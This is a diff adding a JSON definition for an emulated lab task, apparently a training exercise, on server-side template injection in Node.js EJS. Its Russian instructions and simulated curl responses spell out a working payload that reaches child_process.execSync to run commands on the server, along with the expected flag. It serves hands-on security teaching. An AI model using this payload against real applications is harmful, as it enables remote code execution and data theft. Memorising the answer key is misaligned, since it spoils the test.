@@ -1,0 +1,41 @@
+{
+  "id": "web-pug-ejs-nunjucks",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{n0d3_sst1_ch1ld_pr0c3ss}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Node SSTI (EJS)\n\nЭндпоинт /tpl передаёт name в ejs.render(). Дойди до child_process.\n\n1. Подтверди движок:\n   curl -s 'https://app.target/tpl?name=%3C%25%3D%207*7%20%25%3E'\n2. Выполни команду:\n   curl -s 'https://app.target/tpl?name=%3C%25%3D%20process.mainModule.require(%22child_process%22).execSync(%22cat%20/flag%22)%20%25%3E'\n3. Запиши вывод в found.txt и набери check.\n"
+    },
+    {
+      "path": "/home/student/task/notes.txt",
+      "text": "Express + EJS 3.x, template передаётся из параметра.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.target/tpl)",
+      "cases": [
+        {
+          "match": "%3C%25%3D%207\\*7|<%= 7\\*7",
+          "example": "-s '.../tpl?name=<%= 7*7 %>'",
+          "output": "49\n"
+        },
+        {
+          "match": "child_process|execSync|require",
+          "example": "-s '.../tpl?name=<%= process.mainModule.require(\"child_process\").execSync(\"cat /flag\") %>'",
+          "output": "nto{n0d3_sst1_ch1ld_pr0c3ss}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /tpl на app.target.\n"
+    }
+  }
+}
